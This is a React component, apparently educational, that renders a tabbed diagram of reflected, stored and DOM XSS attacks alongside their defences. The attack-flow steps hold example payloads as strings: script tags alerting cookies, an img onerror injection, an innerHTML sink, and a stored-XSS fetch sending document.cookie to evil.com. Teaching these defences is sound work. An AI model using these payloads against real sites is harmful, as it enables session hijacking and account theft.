'use client'
import { useState } from 'react'

type Tab = 'reflected' | 'stored' | 'dom'

interface Variant {
  key: Tab
  label: string
  steps: { label: string; code: string }[]
  defenses: { name: string; code: string }[]
}

const VARIANTS: Variant[] = [
  {
    key: 'reflected',
    label: 'Reflected XSS',
    steps: [
      { label: 'Malicious URL', code: 'https://example.com/search?q=<script>alert(document.cookie)</script>' },
      { label: 'Server reflects input into the page', code: '<p>Results for: <script>alert(document.cookie)</script></p>' },
      { label: 'Script executes in the victim browser', code: 'alert: session_token=abc123   ← cookie stolen' },
    ],
    defenses: [
      { name: 'Output encoding', code: 'res.send(`Results for: ${escapeHTML(q)}`)' },
      { name: 'Content Security Policy', code: "Content-Security-Policy: script-src 'self'" },
    ],
  },
  {
    key: 'stored',
    label: 'Stored XSS',
    steps: [
      { label: 'Attacker submits a comment', code: "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>" },
      { label: 'Payload is saved in the database', code: 'INSERT INTO comments(body) VALUES (\'<script>…</script>\')' },
      { label: 'Every visitor runs it silently', code: 'attacker receives:  c=session_token=abc123' },
    ],
    defenses: [
      { name: 'Sanitize on input', code: 'const clean = DOMPurify.sanitize(body)' },
      { name: 'HttpOnly cookies', code: 'Set-Cookie: session=…; HttpOnly; Secure' },
    ],
  },
  {
    key: 'dom',
    label: 'DOM XSS',
    steps: [
      { label: 'Vulnerable client-side sink', code: "document.getElementById('output').innerHTML = location.hash" },
      { label: 'Attacker crafts the fragment', code: 'https://example.com/#<img src=x onerror=alert(1)>' },
      { label: 'Executes with no server involvement', code: 'onerror fires → alert(1)' },
    ],
    defenses: [
      { name: 'Use textContent', code: "el.textContent = location.hash  // never innerHTML" },
      { name: 'Trusted Types', code: "Content-Security-Policy: require-trusted-types-for 'script'" },
    ],
  },
]

export default function XSSDiagram() {
  const [tab, setTab] = useState<Tab>('reflected')
  const variant = VARIANTS.find(v => v.key === tab)!

  return (
    <div>
      <div className="mb-6 flex flex-wrap gap-2">
        {VARIANTS.map(v => (
          <button
            key={v.key}
            type="button"
            onClick={() => setTab(v.key)}
            className={`rounded border px-4 py-2 font-mono text-sm transition-colors ${
              tab === v.key ? 'border-accent bg-accent/10 text-accent' : 'border-border-subtle text-text-muted hover:border-accent/50'
            }`}
          >
            {v.label}
          </button>
        ))}
      </div>

      <div className="grid grid-cols-1 gap-8 lg:grid-cols-2">
        <div className="rounded-lg border border-danger/40 bg-panel p-6">
          <div className="mb-4 font-mono text-xs text-danger">{'// attack flow'}</div>
          <div className="flex flex-col gap-3">
            {variant.steps.map((s, i) => (
              <div key={i} className="rounded border border-border-subtle p-3">
                <div className="mb-1 font-mono text-xs text-danger">{i + 1}. {s.label}</div>
                <pre className="overflow-x-auto whitespace-pre-wrap font-mono text-xs leading-relaxed text-text-primary">
                  <code>{s.code}</code>
                </pre>
              </div>
            ))}
          </div>
        </div>

        <div className="rounded-lg border border-accent/40 bg-panel p-6">
          <div className="mb-4 font-mono text-xs text-accent">{'// defense'}</div>
          <div className="flex flex-col gap-3">
            {variant.defenses.map(d => (
              <div key={d.name} className="rounded border border-border-subtle p-3">
                <div className="mb-1 text-sm font-semibold text-accent">{d.name}</div>
                <pre className="overflow-x-auto whitespace-pre-wrap font-mono text-xs leading-relaxed text-text-primary">
                  <code>{d.code}</code>
                </pre>
              </div>
            ))}
            <div className="rounded border border-border-subtle p-3">
              <div className="mb-1 text-sm font-semibold text-accent">Always</div>
              <p className="text-xs text-text-muted">HttpOnly cookies prevent JS access; sanitization libraries (DOMPurify) strip dangerous markup.</p>
            </div>
          </div>
        </div>
      </div>

      {/* Why it matters */}
      <div className="mt-8 rounded-lg border border-l-2 border-border-subtle border-l-accent bg-panel p-6">
        <h3 className="mb-2 font-mono text-sm text-accent">{'// why it matters'}</h3>
        <p className="leading-relaxed text-text-muted">
          XSS allows attackers to execute scripts in victims&apos; browsers, steal session tokens, hijack
          accounts, and deface websites. The defense is consistent output encoding — never trust user
          input in HTML context.
        </p>
      </div>
    </div>
  )
}
